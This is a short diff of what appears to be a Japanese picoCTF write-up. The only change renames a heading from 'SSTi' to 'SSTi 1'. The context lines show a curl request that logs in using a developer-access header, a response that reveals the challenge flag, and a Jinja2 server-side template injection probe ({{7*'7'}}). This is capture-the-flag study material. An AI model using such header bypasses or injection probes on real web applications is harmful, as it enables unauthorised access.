@@ -66,7 +66,7 @@ curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=ad
 # {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
 ```
 
-# SSTi
+# SSTi 1
 ## Jinja2のSSTi
 1. `{{7*'7'}}`を試す => `7777777`
 2. Jinja2(Python)
